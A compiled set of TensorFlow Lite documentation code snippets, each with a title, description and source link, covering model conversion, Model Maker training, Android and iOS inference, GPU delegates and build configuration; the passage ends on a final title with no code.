TITLE: Handling Text Classification Errors in Kotlin Listener
DESCRIPTION: This snippet defines the `onError` method of the `TextClassificationHelper.TextResultsListener` object. It is called when an error occurs during the text classification process. The method receives an error message string and displays it to the user using an Android `Toast` notification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_11

LANGUAGE: kotlin
CODE:
```
  private val listener = object : TextClassificationHelper.TextResultsListener {
    ...
    override fun onError(error: String) {
      Toast.makeText(this@MainActivity, error, Toast.LENGTH_SHORT).show()
    }
  }
```

----------------------------------------

TITLE: Initialize and Search with TFLite TextSearcher (C++)
DESCRIPTION: Shows the C++ API for initializing the `TextSearcher`. It configures options like the model file path and L2 normalization for embeddings, creates the searcher instance, and then executes a search query using the provided input text.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/text_searcher.md#_snippet_2

LANGUAGE: C++
CODE:
```
// Initialization
TextSearcherOptions options;
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
options.mutable_embedding_options()->set_l2_normalize(true);
std::unique_ptr<TextSearcher> text_searcher = TextSearcher::CreateFromOptions(options).value();

// Run inference with your input, `input_text`.
const SearchResult result = text_searcher->Search(input_text).value();
```

----------------------------------------

TITLE: Import TFLite Model Maker Searcher Module - Python
DESCRIPTION: This snippet imports the specific `searcher` module from the `tflite_model_maker` library. This module contains the classes and functions required to train and export the TensorFlow Lite Text Searcher model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
from tflite_model_maker import searcher
```

----------------------------------------

TITLE: Evaluating Object Detector Model Python
DESCRIPTION: This method evaluates the trained object detection model using the provided evaluation data. It returns a dictionary containing evaluation metrics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_4

LANGUAGE: python
CODE:
```
evaluate(
    data: tflite_model_maker.object_detector.DataLoader,
    batch_size: Optional[int] = None
) -> Dict[str, float]
```

----------------------------------------

TITLE: Configuring Interpreter API Options Conditionally (Java)
DESCRIPTION: This snippet illustrates how to check the result of the GPU availability task (`useGpuTask`) and add a new `GpuDelegateFactory` to the `InterpreterApi.Options` if the GPU delegate is available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_17

LANGUAGE: Java
CODE:
```
Task<InterpreterApi.Options> interpreterOptionsTask = useGpuTask.continueWith({ task ->
  InterpreterApi.Options options =
      new InterpreterApi.Options().setRuntime(TfLiteRuntime.FROM_SYSTEM_ONLY);
  if (task.getResult()) {
     options.addDelegateFactory(new GpuDelegateFactory());
  }
  return options;
});
```

----------------------------------------

TITLE: Registering TensorFlow Custom Op CPU Kernel (C++)
DESCRIPTION: Registers the C++ kernel implementation (`MultiplexDenseOp`) for the "Examples>MultiplexDense" custom op. It uses the `REGISTER_KERNEL_BUILDER` macro to specify the op name, the supported device (CPU), and type constraints (`T`) as defined in the op interface. `TF_CALL_ALL_TYPES` registers the kernel for various data types.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_3

LANGUAGE: C++
CODE:
```
#define REGISTER_KERNELS(type)                                  \
  REGISTER_KERNEL_BUILDER(Name("Examples>MultiplexDense")       \
                              .Device(::tensorflow::DEVICE_CPU) \
                              .TypeConstraint<type>("T"),       \
                          MultiplexDenseOp<type>)

TF_CALL_ALL_TYPES(REGISTER_KERNELS);
#undef REGISTER_KERNELS

```

----------------------------------------

TITLE: Defining Representative Dataset (Multiple Signatures, Python)
DESCRIPTION: This function is used during full integer quantization calibration when the model has multiple signatures. It yields data for each signature separately, identified by its key. This helps the converter determine the range of activation values for each input tensor within the specified signatures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_1

LANGUAGE: Python
CODE:
```
def representative_dataset():
  # Feed data set for the "encode" signature.
  for data in encode_signature_dataset:
    yield (
      "encode", {
        "image": data.image,
        "bias": data.bias,
      }
    )

  # Feed data set for the "decode" signature.
  for data in decode_signature_dataset:
    yield (
      "decode", {
        "image": data.image,
        "hint": data.hint,
      },
    )
```

----------------------------------------

TITLE: Move Background Dataset and Split Custom Dataset in Python
DESCRIPTION: This code defines a function to move background noise samples into a specified dataset directory and then uses it within conditional logic to integrate background noise and split a custom dataset into training and test sets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
def move_background_dataset(dataset_dir):
  dest_dir = os.path.join(dataset_dir, 'background')
  if os.path.exists(dest_dir):
    files = glob.glob(os.path.join(background_dir, '*.wav'))
    for file in files:
      shutil.move(file, dest_dir)
  else:
    shutil.move(background_dir, dest_dir)
```

LANGUAGE: python
CODE:
```
if use_custom_dataset:
  # Move background samples into custom dataset
  move_background_dataset(dataset_dir)

  # Now we separate some of the files that we'll use for testing:
  test_dir = './dataset-test'
  test_data_ratio = 0.2
  dirs = glob.glob(os.path.join(dataset_dir, '*/'))
  for dir in dirs:
    files = glob.glob(os.path.join(dir, '*.wav'))
    test_count = round(len(files) * test_data_ratio)
    random.seed(42)
    random.shuffle(files)
    # Move test samples:
    for file in files[:test_count]:
      class_dir = os.path.basename(os.path.normpath(dir))
      os.makedirs(os.path.join(test_dir, class_dir), exist_ok=True)
      os.rename(file, os.path.join(test_dir, class_dir, os.path.basename(file)))
    print('Moved', test_count, 'images from', class_dir)
```

----------------------------------------

TITLE: Export Model with Custom Quantization - Python (Model Maker)
DESCRIPTION: This snippet exports the trained TensorFlow Lite model while applying a custom post-training quantization configuration defined previously (e.g., float16). It also allows specifying a custom filename for the output TFLite file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_21

LANGUAGE: python
CODE:
```
model.export(export_dir='.', tflite_filename='model_fp16.tflite', quantization_config=config)
```

----------------------------------------

TITLE: Testing Model Output Shape Python
DESCRIPTION: This code iterates through a dataset batch, runs the model on the input, and prints the shape of the resulting predictions tensor to verify its dimensions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_23

LANGUAGE: python
CODE:
```
for input_example_batch, target_example_batch in dataset.take(1):
    input_example_batch = tnp.asarray(input_example_batch)
    example_batch_predictions = model(input_example_batch)
    print(example_batch_predictions.shape, "# (batch_size, sequence_length, vocab_size)")
```

----------------------------------------

TITLE: Import Libraries Python
DESCRIPTION: Imports essential Python libraries for the audio classification task, including TensorFlow, TensorFlow Lite Model Maker, OS for path manipulation, NumPy, Matplotlib/Seaborn for plotting, Itertools, Glob, Random, IPython display utilities, and SciPy for reading WAV files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
import tensorflow as tf
import tflite_model_maker as mm
from tflite_model_maker import audio_classifier
import os

import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns

import itertools
import glob
import random

from IPython.display import Audio, Image
from scipy.io import wavfile

print(f"TensorFlow Version: {tf.__version__}")
print(f"Model Maker Version: {mm.__version__}")
```

----------------------------------------

TITLE: Creating Object Detector Model Python
DESCRIPTION: This class method initializes and trains an object detection model using provided training and validation data and a model specification. It allows control over epochs, batch size, and whether to train the whole model or just specific layers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create(
    train_data: tflite_model_maker.object_detector.DataLoader,
    model_spec: tflite_model_maker.object_detector.EfficientDetSpec,
    validation_data: Optional[tflite_model_maker.object_detector.DataLoader] = None,
    epochs: Optional[tflite_model_maker.object_detector.DataLoader] = None,
    batch_size: Optional[int] = None,
    train_whole_model: bool = False,
    do_train: bool = True
) -> T
```

----------------------------------------

TITLE: Defining TensorFlow Custom Op Python Wrapper Bazel
DESCRIPTION: Defines a Bazel build rule (`py_strict_library`) for building the Python API wrapper around the C++ kernel of the `multiplex_4` custom op. It specifies the Python source file, its dependency on the compiled shared library (`multiplex_4_kernel.so`), Python version compatibility, and external dependencies like the main TensorFlow library. This rule makes the op importable in Python.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_8

LANGUAGE: Bazel
CODE:
```
py_strict_library(
    name = "multiplex_4_op",
    srcs = ["multiplex_4_op.py"],
    data = ["multiplex_4_kernel.so"],
    srcs_version = "PY3",
    deps = [
        "//third_party/py/tensorflow",
    ],
)
```

----------------------------------------

TITLE: Binding Metal Buffers to TFLite Tensors (C++)
DESCRIPTION: Demonstrates how to use the TensorFlow Lite C++ API with the GPU delegate to bind user-provided Metal buffers (`MTLBuffer`) directly to TFLite input and output tensors using `TFLGpuDelegateBindMetalBufferToTensor`. It also shows how to disable the default GPU-to-CPU output copy using `SetAllowBufferHandleOutput(true)` for performance optimization. This requires building TFLite yourself or using Bazel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_8

LANGUAGE: C++
CODE:
```
#include "tensorflow/lite/delegates/gpu/metal_delegate.h"
#include "tensorflow/lite/delegates/gpu/metal_delegate_internal.h"

// ...

// Prepare GPU delegate.
auto* delegate = TFLGpuDelegateCreate(nullptr);

if (interpreter->ModifyGraphWithDelegate(delegate) != kTfLiteOk) return false;

interpreter->SetAllowBufferHandleOutput(true);  // disable default gpu->cpu copy
if (!TFLGpuDelegateBindMetalBufferToTensor(
        delegate, interpreter->inputs()[0], user_provided_input_buffer)) {
  return false;
}
if (!TFLGpuDelegateBindMetalBufferToTensor(
        delegate, interpreter->outputs()[0], user_provided_output_buffer)) {
  return false;
}

// Run inference.
if (interpreter->Invoke() != kTfLiteOk) return false;
```

----------------------------------------

TITLE: Loading, Processing, and Visualizing MNIST Data (Python)
DESCRIPTION: Defines a `process_data` function to preprocess the MNIST dataset by normalizing images, flattening them, and one-hot encoding labels using `tf.experimental.numpy`. Loads the training and test datasets, processes them, and then plots a few example images from the training set.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
NUM_CLASSES = 10
BATCH_SIZE = 64
INPUT_SIZE = 28 * 28

def process_data(data_dict):
  images = tnp.asarray(data_dict['image']) / 255.0
  images = images.reshape(-1, INPUT_SIZE).astype(tnp.float32)
  labels = tnp.asarray(data_dict['label'])
  labels = tnp.eye(NUM_CLASSES, dtype=tnp.float32)[labels]
  return images, labels

with tf.device("CPU:0"):
  train_dataset = tfds.load('mnist', split='train', shuffle_files=True,
                            batch_size=BATCH_SIZE).map(process_data)
  test_dataset = tfds.load('mnist', split='test', shuffle_files=True,
                          batch_size=-1)
  x_test, y_test = process_data(test_dataset)

  # Plots some examples.
  images, labels = next(iter(train_dataset.take(1)))
  _, axes = plt.subplots(1, 8, figsize=(12, 96))
  for i, ax in enumerate(axes):
    ax.imshow(images[i].reshape(28, 28), cmap='gray')
    ax.axis("off")
    ax.set_title("Label: %d" % int(tnp.argmax(labels[i])))
```

----------------------------------------

TITLE: Evaluating Text QA Model in TensorFlow
DESCRIPTION: Evaluates a trained QA model (Keras or TFLite) against a given dataset. It calculates metrics like Exact Match and F1 score and can optionally save detailed results to JSON files. Requires the model, dataset, prediction details, and various configuration parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_4

LANGUAGE: python
CODE:
```
evaluate(
    model,
    tflite_filepath,
    dataset,
    num_steps,
    eval_examples,
    eval_features,
    predict_file,
    version_2_with_negative,
    max_answer_length,
    null_score_diff_threshold,
    verbose_logging,
    output_dir
)

```

----------------------------------------

TITLE: Initializing TFLite Interpreter with GPU Delegate - C++
DESCRIPTION: Use the TensorFlow Lite C++ API to set up the interpreter and integrate the GPU delegate. After building the model and interpreter, create the delegate using `TFLGpuDelegateCreate`. Instead of `AllocateTensors`, modify the interpreter's graph with the delegate using `ModifyGraphWithDelegate` before running inference. Requires building TFLite from source or using Bazel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_3

LANGUAGE: C++
CODE:
```
// Set up interpreter.
auto model = FlatBufferModel::BuildFromFile(model_path);
if (!model) return false;
tflite::ops::builtin::BuiltinOpResolver op_resolver;
std::unique_ptr<Interpreter> interpreter;
InterpreterBuilder(*model, op_resolver)(&interpreter);

// Prepare GPU delegate.
auto* delegate = TFLGpuDelegateCreate(/*default options=*/nullptr);
if (interpreter->ModifyGraphWithDelegate(delegate) != kTfLiteOk) return false;

// Run inference.
WriteToInputTensor(interpreter->typed_input_tensor<float>(0));
if (interpreter->Invoke() != kTfLiteOk) return false;
ReadFromOutputTensor(interpreter->typed_output_tensor<float>(0));

// Clean up.
TFLGpuDelegateDelete(delegate);
```

----------------------------------------

TITLE: Performing Text Search with TFLite Support TextSearcher (Python)
DESCRIPTION: Performs a text search by extracting features from the input string using the TFLite model and then querying the ScaNN index for nearest neighbors. It requires a text string as input. Returns a `SearchResult` object containing the search results or raises `ValueError` or `RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextSearcher.md#_snippet_4

LANGUAGE: python
CODE:
```
search(
    text: str
) -> tflite_support.task.processor.SearchResult
```

----------------------------------------

TITLE: Obtaining TensorFlow Lite Micro Output Tensor (C++)
DESCRIPTION: Retrieves the first output tensor by calling `output(0)` on the interpreter. Asserts the tensor's properties: 2 dimensions, size 1 in each dimension, and float32 type, based on the example model's structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_16

LANGUAGE: C++
CODE:
```
TfLiteTensor* output = interpreter.output(0);
TF_LITE_MICRO_EXPECT_EQ(2, output->dims->size);
TF_LITE_MICRO_EXPECT_EQ(1, input->dims->data[0]);
TF_LITE_MICRO_EXPECT_EQ(1, input->dims->data[1]);
TF_LITE_MICRO_EXPECT_EQ(kTfLiteFloat32, output->type);
```

----------------------------------------

TITLE: Build Smaller TF Lite AAR for Specific Models/Architectures
DESCRIPTION: Run the build_aar.sh script to generate a customized TensorFlow Lite AAR file. You can specify a subset of target models and CPU architectures to reduce the binary size, including optional support for selected TensorFlow operations if needed by the models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_7

LANGUAGE: sh
CODE:
```
bash tensorflow/lite/tools/build_aar.sh \
  --input_models=model1,model2 \
  --target_archs=x86,x86_64,arm64-v8a,armeabi-v7a
```

----------------------------------------

TITLE: Creating Serving Model and Inspecting IO Python
DESCRIPTION: Creates a version of the trained model suitable for inference by calling `create_serving_model`. It then prints the input and output details (shape and type) of this serving model, which is essential for preparing input data for predictions. Requires a trained `model` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
serving_model = model.create_serving_model()

print(f'Model\'s input shape and type: {serving_model.inputs}')
print(f'Model\'s output shape and type: {serving_model.outputs}')
```

----------------------------------------

TITLE: Populating Metadata into Model - TFLite - Python
DESCRIPTION: Embeds the metadata and associated label files into the TensorFlow Lite model file. This operation returns a new model buffer containing the original model data plus the added metadata. The return value is a `bytearray` representing the modified model buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/object_detector/MetadataWriter.md#_snippet_6

LANGUAGE: Python
CODE:
```
populate() -> bytearray
```

----------------------------------------

TITLE: Invoking DetectorListener onResults Method (Kotlin)
DESCRIPTION: Calls the `onResults` method of an `objectDetectorListener` instance, typically implemented by a UI component like a Fragment, to pass the object detection results, inference time, and image dimensions for processing and display.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_14

LANGUAGE: Kotlin
CODE:
```
objectDetectorListener.onResults(
// instance of CameraFragment
    results,
    inferenceTime,
    tensorImage.height,
    tensorImage.width)
```

----------------------------------------

TITLE: Building TensorFlowLite Bazel Target Shell
DESCRIPTION: Uses Bazel to compile and build the specific TensorFlow Lite Objective-C library target defined in the Bazel build configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_6

LANGUAGE: shell
CODE:
```
bazel build tensorflow/lite/objc:TensorFlowLite
```

----------------------------------------

TITLE: Building Hello World TFLite Micro Binary with Make | bash
DESCRIPTION: Specifically builds the runnable binary for the 'Hello World' example application, which is a common starting point for TFLite Micro development.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/library.md#_snippet_4

LANGUAGE: bash
CODE:
```
make -f tensorflow/lite/micro/tools/make/Makefile hello_world_bin
```

----------------------------------------

TITLE: Specify TFLite Swift Pod Version (Ruby)
DESCRIPTION: Defines the dependency on the TensorFlowLiteSwift pod with a specific version constraint, like '>~ 2.10.0', in the Podfile.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_2

LANGUAGE: Ruby
CODE:
```
pod 'TensorFlowLiteSwift', '~> 2.10.0'
```

----------------------------------------

TITLE: Analyzing Large Keras TFLite Model (MobileNetV3Large) using Analyzer API (Python)
DESCRIPTION: This example illustrates how to use the Analyzer API with larger Keras models, specifically MobileNetV3Large. It involves instantiating the pre-trained model, converting it to the TFLite format, and analyzing the converted model's content using `tf.lite.experimental.Analyzer.analyze`. Analyzing large models produces extensive output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/model_analyzer.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
model = tf.keras.applications.MobileNetV3Large()
fb_model = tf.lite.TFLiteConverter.from_keras_model(model).convert()

tf.lite.experimental.Analyzer.analyze(model_content=fb_model)
```

----------------------------------------

TITLE: Adding TensorFlow Lite Task Vision Dependency Java/Gradle
DESCRIPTION: Configure the Android project's `build.gradle` file to include the necessary TensorFlow Lite Task Vision library and prevent compression of `.tflite` files. This ensures the model file is correctly packaged and available in the APK for the application.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/object_detector.md#_snippet_0

LANGUAGE: gradle
CODE:
```
android {
    // Other settings

    // Specify tflite file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }
}

dependencies {
    // Other dependencies

    // Import the Task Vision Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-vision'
    // Import the GPU delegate plugin Library for GPU inference
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin'
}
```

----------------------------------------

TITLE: Add TensorFlowLite Objective-C Dependency (Bazel)
DESCRIPTION: Adds the TensorFlow Lite Objective-C library as a dependency to an `objc_library` target within a Bazel BUILD file. This integrates the local build of TFLite Objective-C into the Bazel build process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_14

LANGUAGE: Bazel
CODE:
```
objc_library(
  deps = [
      "//tensorflow/lite/objc:TensorFlowLite",
  ],
)
```

----------------------------------------

TITLE: Calculating and Printing Sample Loss Python
DESCRIPTION: This snippet calculates the loss for the example batch using the custom `loss_fn` and prints the mean scalar loss value, along with the shape of the predictions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_29

LANGUAGE: python
CODE:
```
example_batch_loss  = loss_fn(target_example_batch, example_batch_predictions)
print("Prediction shape: ", example_batch_predictions.shape, " # (batch_size, sequence_length, vocab_size)")
print("scalar_loss:      ", tnp.mean(example_batch_loss))
```

----------------------------------------

TITLE: Creating TFLite AudioEmbedder From File Python
DESCRIPTION: A class method to create an `AudioEmbedder` instance directly from the path to a TensorFlow Lite model file. It simplifies initialization by handling option creation internally. Raises `ValueError` or `RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedder.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'AudioEmbedder'
```

----------------------------------------

TITLE: Allocating TFLite Micro Tensors (C++)
DESCRIPTION: Calls the `AllocateTensors()` method on the interpreter instance. This step processes the model graph and allocates the necessary memory for all tensors from the pre-allocated `tensor_arena`. This must be successfully completed before running inference on the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_10

LANGUAGE: C++
CODE:
```
interpreter.AllocateTensors();
```

----------------------------------------

TITLE: Getting Metadata Buffer with TFLite Support in Python
DESCRIPTION: This function extracts and returns the metadata buffer embedded within a TFLite model buffer. It requires a valid buffer representation of the model file as input. The function returns the metadata buffer if present, or `None` if the model does not contain any metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/get_metadata_buffer.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata.get_metadata_buffer(
    model_buf
)
```

----------------------------------------

TITLE: Executing tf.function With Eager Enabled (Python/TensorFlow)
DESCRIPTION: This snippet demonstrates how to temporarily enable eager execution for all `@tf.function` decorated functions using `tf.config.run_functions_eagerly(True)`. When the function `f` is subsequently called, the debugger will land in the original Python code rather than the generated code, facilitating easier debugging.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_2

LANGUAGE: python
CODE:
```
tf.config.run_functions_eagerly(True)
f(1)
```

----------------------------------------

TITLE: Accessing Tensor Metadata (Java)
DESCRIPTION: These Java methods provided by the `MetadataExtractor` class allow developers to retrieve detailed information about the input and output tensors of a TFLite model. This includes the number of tensors, their shape, full metadata objects, and quantization parameters. Requires an initialized `MetadataExtractor` object with embedded metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_13

LANGUAGE: java
CODE:
```
public int getInputTensorCount();
public TensorMetadata getInputTensorMetadata(int inputIndex);
public QuantizationParams getInputTensorQuantizationParams(int inputIndex);
public int[] getInputTensorShape(int inputIndex);
public int getoutputTensorCount();
public TensorMetadata getoutputTensorMetadata(int inputIndex);
public QuantizationParams getoutputTensorQuantizationParams(int inputIndex);
public int[] getoutputTensorShape(int inputIndex);
```

----------------------------------------

TITLE: Performing Classification with AudioClassifier Python
DESCRIPTION: Performs audio classification using the provided TensorAudio input. It processes the audio data through the loaded TFLite model and returns a ClassificationResult object containing the classification probabilities or scores.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioClassifier.md#_snippet_1

LANGUAGE: Python
CODE:
```
classify(
    audio: <a href="../../../tflite_support/task/audio/TensorAudio"><code>tflite_support.task.audio.TensorAudio</code></a>
) -> <a href="../../../tflite_support/task/processor/ClassificationResult"><code>tflite_support.task.processor.ClassificationResult</code></a>
```

----------------------------------------

TITLE: Listing SignatureDefs in TensorFlow Lite Python
DESCRIPTION: Returns a dictionary providing details about the SignatureDefs present in the model. The dictionary is keyed by the SignatureDef method name, and the value contains a dictionary describing the inputs and outputs, which is useful for interacting with SignatureDefs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_7

LANGUAGE: python
CODE:
```
get_signature_list()
```

----------------------------------------

TITLE: Upgrading Single File using tf_upgrade_v2 (Shell)
DESCRIPTION: Demonstrates how to run the `tf_upgrade_v2` script on a single Python file. You specify the input file path using `--infile` and the desired output file path using `--outfile`. This requires the TensorFlow pip package to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/compatibility/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
tf_upgrade_v2 --infile foo.py --outfile foo-upgraded.py
```

----------------------------------------

TITLE: Initializing SentencePieceTokenizerMd - Python
DESCRIPTION: Initializes the SentencePieceTokenizerMd object. Requires the path to the SentencePiece model file and optionally accepts the path to a vocabulary file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/SentencePieceTokenizerMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.SentencePieceTokenizerMd(
    sentence_piece_model_path: str, vocab_file_path: Optional[str] = None
)
```

----------------------------------------

TITLE: Converting Keras Model to Default Float TFLite Python
DESCRIPTION: Initializes a TensorFlow Lite Converter from a trained Keras model. It then converts the model to the default TensorFlow Lite flatbuffer format, which typically uses float32 data types for weights and activations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Running Audio Classification Inference in iOS Objective-C
DESCRIPTION: This Objective-C snippet initializes the TFLAudioClassifier, creates input TFLAudioTensor and TFLAudioRecord objects, requests microphone permissions via AVAudioSession, starts recording, loads the audio into the tensor, and performs classification. It requires the TensorFlowLiteTaskAudio pod dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/audio_classifier.md#_snippet_4

LANGUAGE: Objective-C
CODE:
```
// Imports
#import <TensorFlowLiteTaskAudio/TensorFlowLiteTaskAudio.h>
#import <AVFoundation/AVFoundation.h>

// Initialization
NSString *modelPath = [[NSBundle mainBundle] pathForResource:@"sound_classification" ofType:@"tflite"];

TFLAudioClassifierOptions *options =
    [[TFLAudioClassifierOptions alloc] initWithModelPath:modelPath];

// Configure any additional options:
// options.classificationOptions.maxResults = 3;

TFLAudioClassifier *classifier = [TFLAudioClassifier audioClassifierWithOptions:options
                                                                          error:nil];

// Create Audio Tensor to hold the input audio samples which are to be classified.
// Created Audio Tensor has audio format matching the requirements of the audio classifier.
// For more details, please see:
// https://github.com/tensorflow/tflite-support/blob/master/tensorflow_lite_support/ios/task/audio/core/audio_tensor/sources/TFLAudioTensor.h
TFLAudioTensor *audioTensor = [classifier createInputAudioTensor];

// Create Audio Record to record the incoming audio samples from the on-device microphone.
// Created Audio Record has audio format matching the requirements of the audio classifier.
// For more details, please see:
https://github.com/tensorflow/tflite-support/blob/master/tensorflow_lite_support/ios/task/audio/core/audio_record/sources/TFLAudioRecord.h
TFLAudioRecord *audioRecord = [classifier createAudioRecordWithError:nil];

// Request record permissions from AVAudioSession before invoking -[TFLAudioRecord startRecordingWithError:].
[[AVAudioSession sharedInstance] requestRecordPermission:^(BOOL granted) {
    if (granted) {
        dispatch_async(dispatch_get_main_queue(), ^{
            // Start recording the incoming audio samples from the on-device microphone.
            [audioRecord startRecordingWithError:nil];

            // Load the samples currently held by the audio record buffer into the audio tensor.
            [audioTensor loadAudioRecord:audioRecord withError:nil];

            // Run inference
            TFLClassificationResult *classificationResult =
                [classifier classifyWithAudioTensor:audioTensor error:nil];

        });
    }
}];
```

----------------------------------------

TITLE: Creating ObjectDetector from Options Object in Python
DESCRIPTION: This class method initializes an `ObjectDetector` using a pre-configured `ObjectDetectorOptions` object. This allows for more detailed customization of the detection process compared to loading from a file path directly. It requires the model to be specified within the options and may raise `ValueError` or `RuntimeError`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ObjectDetector.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: <a href="../../../tflite_support/task/vision/ObjectDetectorOptions"><code>tflite_support.task.vision.ObjectDetectorOptions</code></a>
) -> 'ObjectDetector'
```

----------------------------------------

TITLE: Initializing tf.lite.RepresentativeDataset in Python
DESCRIPTION: This snippet shows the constructor signature for the `tf.lite.RepresentativeDataset` class. It is initialized with a generator function (`input_gen`) that provides sample input data used for calibrating or estimating the range of model arrays during quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/RepresentativeDataset.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.lite.RepresentativeDataset(
    input_gen
)
```

----------------------------------------

TITLE: Filtering ABIs for Smaller TFLite AAR - Gradle
DESCRIPTION: This Gradle snippet demonstrates how to reduce the size of the Android AAR containing TensorFlow Lite and select TF ops by filtering the native ABI architectures included in the `ndk` configuration within the `defaultConfig` block.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_2

LANGUAGE: build
CODE:
```
android {
    defaultConfig {
        ndk {
            abiFilters 'armeabi-v7a', 'arm64-v8a'
        }
    }
}
```

----------------------------------------

TITLE: Initializing BERT Classifier Spec (Python)
